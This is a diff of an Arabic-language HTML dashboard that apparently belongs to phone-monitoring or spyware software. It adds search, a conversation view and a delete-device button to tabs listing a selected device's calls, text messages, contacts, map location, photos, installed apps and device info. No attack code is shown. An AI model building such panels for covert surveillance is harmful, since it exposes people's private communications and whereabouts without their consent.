@@ -14,6 +14,7 @@
                 <select id="deviceSelect" onchange="selectDevice(this.value)">
                     <option value="">اختر الجهاز...</option>
                 </select>
+                <button onclick="deleteDevice()" class="delete-btn">🗑️ حذف الجهاز</button>
                 <button onclick="logout()" class="logout-btn">خروج</button>
             </div>
         </header>
@@ -38,66 +39,90 @@
         </div>
         
         <div class="tabs">
-            <button class="tab active" onclick="switchTab('calls')">المكالمات <span id="callCount" class="count"></span></button>
-            <button class="tab" onclick="switchTab('sms')">الرسائل <span id="smsCount" class="count"></span></button>
-            <button class="tab" onclick="switchTab('contacts')">جهات الاتصال <span id="contactsCount" class="count"></span></button>
-            <button class="tab" onclick="switchTab('location')">الموقع</button>
-            <button class="tab" onclick="switchTab('images')">الصور <span id="imagesCount" class="count"></span></button>
-            <button class="tab" onclick="switchTab('apps')">التطبيقات <span id="appsCount" class="count"></span></button>
-            <button class="tab" onclick="switchTab('device')">الجهاز</button>
+            <button class="tab active" onclick="switchTab('calls')">📞 المكالمات <span id="callCount" class="count"></span></button>
+            <button class="tab" onclick="switchTab('sms')">💬 الرسائل <span id="smsCount" class="count"></span></button>
+            <button class="tab" onclick="switchTab('contacts')">👥 جهات الاتصال <span id="contactsCount" class="count"></span></button>
+            <button class="tab" onclick="switchTab('location')">📍 الموقع</button>
+            <button class="tab" onclick="switchTab('images')">🖼️ الصور <span id="imagesCount" class="count"></span></button>
+            <button class="tab" onclick="switchTab('apps')">📱 التطبيقات <span id="appsCount" class="count"></span></button>
+            <button class="tab" onclick="switchTab('device')">📊 الجهاز</button>
         </div>
         
         <div class="tab-content">
+            <!-- المكالمات -->
             <div id="callsTab" class="tab-pane active">
                 <h3>سجل المكالمات</h3>
+                <input type="text" id="callSearch" placeholder="🔍 بحث برقم..." onkeyup="filterCalls()" class="search-input">
                 <table id="callsTable">
                     <thead>
-                        <tr><th>الرقم</th><th>المدة</th><th>النوع</th><th>التاريخ</th></tr>
+                        <tr>
+                            <th>الرقم</th>
+                            <th>الاسم</th>
+                            <th>النوع</th>
+                            <th>المدة</th>
+                            <th>التاريخ</th>
+                        </tr>
                     </thead>
                     <tbody></tbody>
                 </table>
             </div>
             
+            <!-- الرسائل -->
             <div id="smsTab" class="tab-pane">
-                <h3>الرسائل</h3>
-                <table id="smsTable">
-                    <thead>
-                        <tr><th>المرسل</th><th>الرسالة</th><th>التاريخ</th><th>النوع</th></tr>
-                    </thead>
-                    <tbody></tbody>
-                </table>
+                <h3>المحادثات</h3>
+                <div id="conversationsList"></div>
+                <div id="chatView" style="display:none;">
+                    <button onclick="backToConversations()" class="back-btn">⬅️ رجوع</button>
+                    <h4 id="chatTitle"></h4>
+                    <div id="messagesList" class="messages-list"></div>
+                </div>
             </div>
             
+            <!-- جهات الاتصال -->
             <div id="contactsTab" class="tab-pane">
                 <h3>جهات الاتصال</h3>
+                <input type="text" id="contactSearch" placeholder="🔍 بحث..." onkeyup="filterContacts()" class="search-input">
                 <table id="contactsTable">
                     <thead>
-                        <tr><th>الاسم</th><th>الأرقام</th></tr>
+                        <tr>
+                            <th>الاسم</th>
+                            <th>الأرقام</th>
+                            <th>إجراء</th>
+                        </tr>
                     </thead>
                     <tbody></tbody>
                 </table>
             </div>
             
+            <!-- الموقع -->
             <div id="locationTab" class="tab-pane">
                 <h3>الموقع الجغرافي</h3>
+                <div id="locationDetails"></div>
                 <div id="map" style="height:400px;"></div>
             </div>
             
+            <!-- الصور -->
             <div id="imagesTab" class="tab-pane">
                 <h3>الصور</h3>
                 <div id="imagesGrid" class="images-grid"></div>
             </div>
             
+            <!-- التطبيقات -->
             <div id="appsTab" class="tab-pane">
                 <h3>التطبيقات</h3>
                 <table id="appsTable">
                     <thead>
-                        <tr><th>الاسم</th><th>الحزمة</th><th>نظام</th></tr>
+                        <tr>
+                            <th>الاسم</th>
+                            <th>الحزمة</th>
+                            <th>نظام</th>
+                        </tr>
                     </thead>
                     <tbody></tbody>
                 </table>
             </div>
             
+            <!-- الجهاز -->
             <div id="deviceTab" class="tab-pane">
                 <h3>معلومات الجهاز</h3>
                 <div id="deviceInfo"></div>
